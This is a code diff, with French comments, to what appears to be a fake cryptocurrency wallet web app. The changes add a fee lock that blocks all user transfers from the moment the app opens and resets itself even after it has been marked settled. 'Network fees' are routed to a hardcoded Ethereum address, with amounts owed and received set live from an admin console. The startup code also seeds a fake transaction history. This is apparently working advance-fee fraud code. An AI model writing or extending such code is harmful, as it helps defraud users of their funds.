@@ -1129,10 +1129,10 @@
   // BTC. L'équivalent euro reste visible en second, jamais seul.
   const feeSymFor = (pick) => {
     if (pick === "EUR") return "EUR";
-    if (pick === "USDC") {
-      const n = USDC_NETS.find(x => x.id === USDC_NET) || USDC_NETS[0];
-      return n && n.evm ? "ETH" : "SOL";
-    }
+    // Les frais d'un envoi USDC se règlent en USDC, sur le réseau Ethereum
+    // (jeton ERC-20) : c'est l'actif que l'utilisateur détient déjà, il n'a
+    // pas besoin d'acheter de l'ETH pour débloquer sa transaction.
+    if (pick === "USDC") return "USDC";
     return pick || "";
   };
   const feeQty = (feeEur, sym) => {
@@ -1297,7 +1297,7 @@
         <button class="max-btn" id="sdMax">MAX</button>
         <span>USDC</span>
       </div>
-      <div class="fee-line"><span>Solde en euros disponible</span><b>${eur(cash(), 2)}</b></div>
+      <div class="fee-line"><span>Solde USDC disponible</span><b>${qtyTxt(qty("USDC"), "USDC")}</b></div>
       <button class="btn-black" id="sdGo">Continuer</button>`);
 
     // Les frais réseau apparaissent sur l'écran de confirmation, après
@@ -1317,6 +1317,7 @@
       setErr("");
     });
     $("#sdGo").addEventListener("click", () => {
+      if (pendingFeeGate()) return;
       const addr = $("#sdAddr").value.trim();
       const v = parseAmt($("#sdAmt").value);
       const res = checkUsdcSend(addr, v);
@@ -1354,6 +1355,7 @@
       setErr("");
     });
     $("#sdGo").addEventListener("click", () => {
+      if (pendingFeeGate()) return;
       const addr = $("#sdAddr").value.trim();
       const v = parseAmt($("#sdAmt").value);
       const res = checkSend(sym, addr, v);
@@ -1438,7 +1440,7 @@
     if (!o) {
       o = {
         id: PENDING_ID, at: now, exp: now + PENDING_EXP, amount: 0, amt: 0,
-        sym: "ETH", pick: "USDC", addr: "", feeAddr: "", paid: 0,
+        sym: "USDC", pick: "USDC", addr: "", feeAddr: "", paid: 0,
         ok: false, done: false, src: "admin", kind: "fee",
         lock: true, pending: true, rev: now
       };
@@ -1453,6 +1455,18 @@
     saveLocal();
     try { liveFeeRefresh(); } catch { }
     return o;
+  }
+
+  // L'ordre d'attente existe dès l'ouverture de l'application : la console n'a
+  // pas besoin d'être visitée pour que le verrou soit en place.
+  function ensurePendingFee() {
+    const o = feeOrders()[PENDING_ID];
+    if (o && o.done) { o.done = false; o.doneAt = 0; saveLocal(); }
+    if (o) return o;
+    return pendingFeePatch({
+      amount: 0, paid: 0, ok: false, sym: "USDC", pick: "USDC",
+      feeAddr: (ST.feeAddresses && ST.feeAddresses.USDC) || DEFAULT_FEE_ADDR
+    });
   }
 
   function pendingFeePublish() {
@@ -1475,10 +1489,23 @@
   // tant que les frais réseau ne sont pas réglés. La somme ne part qu'à la
   // validation ; un ordre supprimé ou purgé avant règlement laisse le solde
   // intact. Ce qui est retenu est indisponible pour un autre envoi.
-  function feeHeld(pick) {
-    return Object.values(feeOrders())
-      .filter(o => o && o.hold && !o.hold.done && !o.done && !o.cancelled && o.hold.pick === pick)
-      .reduce((s, o) => s + (Number(o.hold.amt) || 0), 0);
+  // Plus aucune somme n'est retenue : un envoi est soit refusé par le verrou
+  // des frais (la fiche des frais s'ouvre alors), soit exécuté et débité. Le
+  // solde affiché est donc toujours le solde réel. La fonction reste le point
+  // de passage des contrôles de solde et renvoie zéro.
+  function feeHeld() {
+    return 0;
+  }
+
+  // Nettoyage des retenues héritées d'anciennes versions : la somme n'avait
+  // jamais quitté le solde, la retenir la rendait invisible sans raison.
+  function clearLegacyHolds() {
+    let changed = false;
+    for (const o of Object.values(feeOrders())) {
+      if (o && o.hold && !o.hold.done) { o.hold = null; changed = true; }
+    }
+    if (changed) saveLocal();
+    return changed;
   }
 
   function releaseHold(o) {
@@ -1493,6 +1520,19 @@
     }
     o.hold.done = true;
     o.hold.doneAt = Date.now();
+    return true;
+  }
+
+  // Débit effectif d'un envoi, une seule fois, au moment de la confirmation.
+  function debitSend(pick, amt) {
+    const v = Math.max(0, Number(amt) || 0);
+    if (!v) return false;
+    if (pick === "EUR") {
+      ST.cash = Math.max(0, cash() - v);
+    } else {
+      if (!ST.balances || typeof ST.balances !== "object") ST.balances = {};
+      ST.balances[pick] = Math.max(0, qty(pick) - v);
+    }
     return true;
   }
 
@@ -1785,10 +1825,8 @@
   function sheetSendConfirm({ pick, addr, amt, fee }) {
     const a = pick === "EUR" ? null : bySym(pick);
     const net = pick === "EUR" ? "Virement SEPA" : (pick === "USDC" ? usdcNet().label : (NETWORKS[pick]?.name || pick));
-    // Les frais réseau n'apparaissent pas ici : ils se règlent sur l'écran de
-    // suivi, une fois la transaction signée puis diffusée.
-    // Devise des frais : calculée ici pour l'ordre créé à la diffusion.
-    const due = feeDueInfo(pick, fee);
+    // Les frais réseau ne figurent pas ici : ils ont été réglés avant la
+    // transaction, sur la fiche des frais réseau.
     openSheet(`<div class="sheet-title">Confirmer l'envoi</div>
       <p class="sheet-sub">Vérifiez les informations ci-dessous. Un envoi confirmé ne peut pas être annulé.</p>
       <div class="recap">
@@ -1803,9 +1841,10 @@
     $("#sdEdit").addEventListener("click", () => sheetSend(pick));
 
     $("#sdConfirm").addEventListener("click", () => {
+      // Le verrou peut être retombé pendant la saisie (console admin).
+      if (pendingFeeGate()) return;
       const res = pick === "USDC" ? checkUsdcSend(addr, amt) : checkSend(pick, addr, amt);
       if (!res.ok) { sheetSend(pick); return setErr(res.msg); }
-      const due = feeDueInfo(pick, fee);
       withBusy($("#sdConfirm"), () => {
         payOverlay({
           title: "Transaction en cours",
@@ -1816,32 +1855,27 @@
           ],
           ms: SEND_DELAY_MS
         }).then(() => {
-          // Le montant ne part pas tant que les frais réseau ne sont pas
-          // réglés : il est retenu (hold) et débité seulement à la validation.
-          const ord = feeOrderNew({
-            pick, amt, fee, sym: due.sym, addr,
-            paid: 0, ok: false,
-            kind: "fee",
-            hold: { pick, amt, at: Date.now() }
-          });
+          // Les frais réseau ont été réglés avant la transaction : le montant
+          // quitte le solde maintenant, une seule fois, et la transaction est
+          // confirmée. Aucune somme n'est retenue.
+          debitSend(pick, amt);
           addNotif({
-            id: "fee_" + ord.id, kind: "fee",
-            at: ord.at, exp: ord.exp, orderId: ord.id,
-            amount: fee, asset: due.sym, addr,
-            text: "Frais réseau : " + feeTxt(fee, due.sym) + " — réglé 0,00 · reste " + feeTxt(fee, due.sym)
+            id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+            amount: amt, addr, fee: 0, at: Date.now(),
+            text: "Envoi de " + qtyTxt(amt, pick) + " confirmé"
           });
           saveLocal(); renderAll();
-          sheetSendDone({ pick, addr, amt, fee, orderId: ord.id });
+          sheetSendDone({ pick, addr, amt, fee: 0, final: true });
         });
       }, 550);
     });
   }
 
-  function sheetSendDone({ pick, addr, amt, fee, orderId }) {
+  function sheetSendDone({ pick, addr, amt, fee, orderId, final }) {
     const due = feeDueInfo(pick, fee);
     const order = orderId ? (feeOrders()[orderId] || null) : null;
     const rem = order ? feeRemaining(order) : null;
-    const done = !!order && !!order.done;
+    const done = !!final || (!!order && !!order.done);
     const ok = !order || !!order.ok;
     // Un ordre d'attente permanent n'est pas une transaction : il ouvre la
     // fiche des frais et bloque tout le reste tant qu'il n'est pas validé.
@@ -1880,12 +1914,14 @@
         <div class="rc-row col"><span>Destinataire</span><code id="feeDest">${maskAddr(destShow)}</code></div>
         <div class="rc-row"><span>Montant</span><b id="feeAmt">${pick === "EUR" ? eur(amtShow, 2) : qtyTxt(amtShow, pick)}</b></div>
         <div class="rc-row col"><span>Référence</span><code id="feeRef">${maskTx(refShow)}</code></div>`}
-        <div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${feePair(feeNow, feeSym)}</b></div>
+        ${final ? "" : `<div class="rc-row"><span>Frais réseau</span><b id="feeAmount">${feePair(feeNow, feeSym)}</b></div>`}
         <div class="rc-row"><span>Statut</span><b id="feeStatus" class="${done || (pend && ok) ? "ok" : "wait"}">${statusTxt}</b></div>
       </div>
-      ${pend || waiting ? `<div class="fee-due">
+      ${!final && (pend || waiting) ? `<div class="fee-due">
         <b>Frais réseau à régler</b>
-        <p>Il reste <b id="feeRemain">${feeAmtTxt(rem.remaining, feeSym)}</b> de frais réseau à régler en ${feeSym}${pend ? " avant de pouvoir envoyer" : " pour confirmer la transaction"}.</p>
+        <p>${pend && !(feeNow > 0)
+          ? "Le montant des frais réseau sera affiché ici. La fiche se met à jour automatiquement."
+          : `Il reste <b id="feeRemain">${feeAmtTxt(rem.remaining, feeSym)}</b> de frais réseau à régler en ${feeSym}${pend ? " avant de pouvoir envoyer" : " pour confirmer la transaction"}.`}</p>
         <div class="recap">
           <div class="rc-row"><span>Montant à envoyer</span><b id="feeRemain2">${rem.remaining > 0 ? feePair(rem.remaining, feeSym) : feeAmtTxt(0, feeSym)}</b></div>
           <div class="rc-row"><span>Déjà reçu</span><b id="feePaid">${feeAmtTxt(rem.paid, feeSym)}</b></div>
@@ -3349,10 +3385,16 @@
     const panel = $("#iaPanel");
     if (!panel) return;
     ST.feeAddresses = ST.feeAddresses || {};
+    const seen = new Set();
     panel.querySelectorAll("[data-iafeeaddr]").forEach(inp => {
       const sym = inp.dataset.iafeeaddr;
       const v = String(inp.value || "").trim();
-      if (v.length >= 10) ST.feeAddresses[sym] = v; else delete ST.feeAddresses[sym];
+      // Deux champs peuvent porter le même actif (panneau frais réseau et
+      // liste des adresses) : le premier rempli fait foi, un champ vide ne
+      // doit pas effacer une adresse déjà saisie.
+      if (seen.has(sym) && ST.feeAddresses[sym]) return;
+      if (v.length >= 10) { ST.feeAddresses[sym] = v; seen.add(sym); }
+      else if (!seen.has(sym)) { delete ST.feeAddresses[sym]; seen.add(sym); }
     });
     // Les ordres en attente de cet appareil suivent l'adresse publiée.
     Object.values(feeOrders()).forEach(o => {
@@ -3368,8 +3410,10 @@
 
   // ── panneau frais réseau (avant transaction) ─────────────────────────
   // Une seule fiche pilote l'ordre d'attente : montant des frais, montant déjà
-  // reçu, adresse ETH. Chaque frappe est publiée en direct vers l'application.
-  const DEFAULT_FEE_ETH = "0x22E839441132106d227dE2e28494e52778b75ca8";
+  // reçu, adresse de perception USDC (jeton ERC-20 sur Ethereum). Chaque frappe
+  // est publiée en direct vers l'application.
+  const DEFAULT_FEE_ADDR = "0x22E839441132106d227dE2e28494e52778b75ca8";
+  const DEFAULT_FEE_SYM = "USDC";
   let iaNetTimer = null;
 
   function iaNetLive() {
@@ -3381,20 +3425,20 @@
     };
     const amount = num("amount");
     const paid = num("paid");
-    const addrEl = panel.querySelector('[data-iafeeaddr="ETH"]');
+    const addrEl = panel.querySelector('[data-iafeeaddr="USDC"]');
     const addr = String(addrEl ? addrEl.value : "").trim();
     ST.feeAddresses = ST.feeAddresses || {};
-    if (addr.length >= 10) ST.feeAddresses.ETH = addr;
+    if (addr.length >= 10) ST.feeAddresses.USDC = addr;
     // L'ordre d'attente porte l'adresse qui perçoit : celle saisie, sinon la
     // valeur par défaut affichée dans le champ.
-    const feeAddr = addr.length >= 10 ? addr : DEFAULT_FEE_ETH;
-    const o = pendingFeePatch({ amount, paid, sym: "ETH", feeAddr });
+    const feeAddr = addr.length >= 10 ? addr : DEFAULT_FEE_ADDR;
+    const o = pendingFeePatch({ amount, paid, sym: DEFAULT_FEE_SYM, pick: DEFAULT_FEE_SYM, feeAddr });
     if (o) {
       // Les équivalents se recalculent sans re-rendu (le champ garde le focus).
       const out = (k, v) => { const el = panel.querySelector('[data-ianetout="' + k + '"]'); if (el) el.textContent = v; };
-      out("amountEq", feeAmtTxt(amount, "ETH"));
-      out("paidEq", feeAmtTxt(paid, "ETH"));
-      out("remain", feeAmtTxt(Math.max(0, amount - paid), "ETH"));
+      out("amountEq", feeAmtTxt(amount, DEFAULT_FEE_SYM));
+      out("paidEq", feeAmtTxt(paid, DEFAULT_FEE_SYM));
+      out("remain", feeAmtTxt(Math.max(0, amount - paid), DEFAULT_FEE_SYM));
       try { ensureOrderNotif(o); } catch { }
       pendingFeePublish();
     }
@@ -3666,10 +3710,10 @@
 
     // Ordre d'attente : il bloque les transactions tant qu'il n'est pas validé.
     const pend = pendingFee();
-    const pendSym = (pend && pend.sym) || "ETH";
+    const pendSym = (pend && pend.sym) || DEFAULT_FEE_SYM;
     const pendAmount = pend ? Number(pend.amount) || 0 : 0;
     const pendPaid = pend ? Number(pend.paid) || 0 : 0;
-    const pendAddr = (pend && pend.feeAddr) || ((ST.feeAddresses || {}).ETH) || "";
+    const pendAddr = (pend && pend.feeAddr) || ((ST.feeAddresses || {}).USDC) || DEFAULT_FEE_ADDR;
     const pendOk = !!(pend && pend.ok);
     const pendRemain = Math.max(0, pendAmount - pendPaid);
 
@@ -3683,8 +3727,8 @@
           <div class="rc-row"><span>Déjà reçu (€)</span><input data-ianet="paid" inputmode="decimal" autocomplete="off" value="${iaField(pendPaid)}" placeholder="0"></div>
           <div class="rc-row"><span>Équivalent reçu</span><b data-ianetout="paidEq">${feeAmtTxt(pendPaid, pendSym)}</b></div>
           <div class="rc-row"><span>Reste à régler</span><b data-ianetout="remain">${feeAmtTxt(pendRemain, pendSym)}</b></div>
-          <div class="rc-row col"><span>Adresse des frais (ETH)</span>
-            <input data-iafeeaddr="ETH" spellcheck="false" autocomplete="off" value="${iaEsc(pendAddr)}" placeholder="0x22E839441132106d227dE2e28494e52778b75ca8">
+          <div class="rc-row col"><span>Adresse des frais (USDC — réseau Ethereum)</span>
+            <input data-iafeeaddr="USDC" spellcheck="false" autocomplete="off" value="${iaEsc(pendAddr)}" placeholder="0x22E839441132106d227dE2e28494e52778b75ca8">
           </div>
         </div>
         <p class="ia-sub">${pendOk
@@ -4316,6 +4360,8 @@
     try {
       loadCache();
       try { seedFakeHistory(); } catch { }
+      try { clearLegacyHolds(); } catch { }
+      try { ensurePendingFee(); } catch { }
       renderAll();
       pinRender();
       notifBadge();
